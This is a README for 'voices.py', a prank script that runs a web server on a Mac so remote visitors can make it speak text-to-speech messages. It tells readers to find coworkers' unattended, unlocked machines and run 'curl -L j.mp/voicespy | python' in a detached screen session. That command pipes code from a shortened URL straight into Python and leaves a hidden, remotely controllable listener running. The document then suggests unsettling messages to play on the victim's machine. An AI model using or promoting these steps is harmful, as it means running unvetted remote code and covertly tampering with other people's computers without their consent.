voices.py
=========

What is it?
-----------

**voices.py** is a self-contained python script that starts a webserver that listens on a user-entered IP and port that allows a visitor to remotely send text-to-speech commands on OS X machines.

What is it good for?
--------------------

The machines that coworkers would leave unattended **and unlocked** is the primary impetus.  If you find such a machine, do the following:

1. Open up Terminal.app

2. Type the following::

    $ screen
    $ curl -L j.mp/voicespy | python

3. Now press control-a then "d" to detach the screen session.

4. In a browser, go to the entered IP and port number.  For example, ``http://192.168.1.199:8888``.  You should be presented with a page that has a select box and a text box.  Simply choose a voice and enter a message.

5. Press "Say".

6. Profit.

Why do I want to do this?
-------------------------

For hilarity! Suggestions:

1. Use the "Whisper" voice and have the target's computer whisper "kill all humans" every 30 minutes or so.

2. Use "Cellos" with a suitably catchy lyric.

3. Use "Trinoids" and make the computer say: "Please wait. Calculating.  Boop dee boop dee boop dee boop dee boop dee boop."

Requirements
------------

Mac OS X, obviously.  And also Python.

Usage details
-------------

Without an argument, **voices.py** will attempt to autodiscover your IP and automatically use 8888 as the port::

    $ python voices.py 
    Explicit IP and port not entered.  Attempted to autodiscover IP address.
    Serving on 192.168.1.199:8888

With an argument, **voices.py** will use the IP and port you entered.  Note that python does not have permission to bind to IPs that are not used by your machine::

    $ python voices.py 192.168.1.199:8080
    Serving on 192.168.1.199:8080

For a short help, do use ``--help``::

    $ python voices.py --help
    Usage: python voices.py x.x.x.x:port

